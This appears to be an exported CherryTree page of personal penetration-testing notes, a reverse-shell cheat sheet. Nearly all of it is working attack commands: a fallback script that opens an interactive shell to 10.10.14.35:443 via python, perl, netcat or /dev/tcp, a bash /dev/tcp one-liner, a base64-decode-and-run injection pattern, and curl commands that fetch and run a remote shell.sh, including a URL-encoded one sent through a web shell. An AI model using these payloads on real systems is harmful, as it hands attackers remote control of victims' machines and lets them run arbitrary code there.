<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>bash</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>bash</h1><br/><p><strong><h2> bash for all  shells !!!!</h2></strong><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> #!\usr\bin\bash</h3><h3></h3></p><p><h3> if command -v python &gt; /dev/null 2&gt;&amp;1; then</h3><h3></h3></p><p><h3>         python -c &#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.35&quot;,443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</h3><h3></h3></p><p><h3>         exit;</h3><h3></h3></p><p><h3> fi</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> if command -v perl &gt; /dev/null 2&gt;&amp;1; then</h3><h3></h3></p><p><h3>         perl -e &#39;use Socket;$i=&quot;10.10.14.35&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</h3><h3></h3></p><p><h3>         exit;</h3><h3></h3></p><p><h3> fi</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> if command -v nc &gt; /dev/null 2&gt;&amp;1; then</h3><h3></h3></p><p><h3>         rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.35 443 &gt;/tmp/f</h3><h3></h3></p><p><h3>         exit;</h3><h3></h3></p><p><h3> fi</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> if command -v sh &gt; /dev/null 2&gt;&amp;1; then</h3><h3></h3></p><p><h3>         /bin/sh -i &gt;&amp; /dev/tcp/10.10.14.35/443 0&gt;&amp;1</h3><h3></h3></p><p><h3>         exit;</h3><h3></h3></p><p><h3> fi</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2>The best </h2><h3></h3></p><p><h3> * bash -c // solves problems </h3><h3></h3></p><p><h3> </h3><h3>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.60/443 0&gt;&amp;1&quot;</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h2>Bash base64 command injection:</h2><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> `echo [base64 encoded payload]| base64 -d | bash`</h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><strong><h3>WEB SERVER METHOD </h3></strong><h3>• create file :</h3><h3></h3></p><p><h3> • ◇ #!/bin/bash</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3> ◇ bash -i &gt;&amp; /dev/tcp/tun0ip/53 0&gt;&amp;1</h3><h3></h3></p><p><h3>  </h3><h3></h3></p><p><h3> ◇ curl http://10.x.x.x/shell.sh|bash &amp;</h3><h3></h3></p><p><h3>  </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> • To avoid bad chars </h3><h3></h3></p><p><h3> • ◇ Url encoding </h3><h3></h3></p><p><h3> ◇ ▪ curl &#39;http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.123.43%3A80%2Fshell.sh%7Cbash%20%26&#39;</h3><h3></h3></p><p><h3>  </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> ◇ </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3></p></div>
</body>
</html>
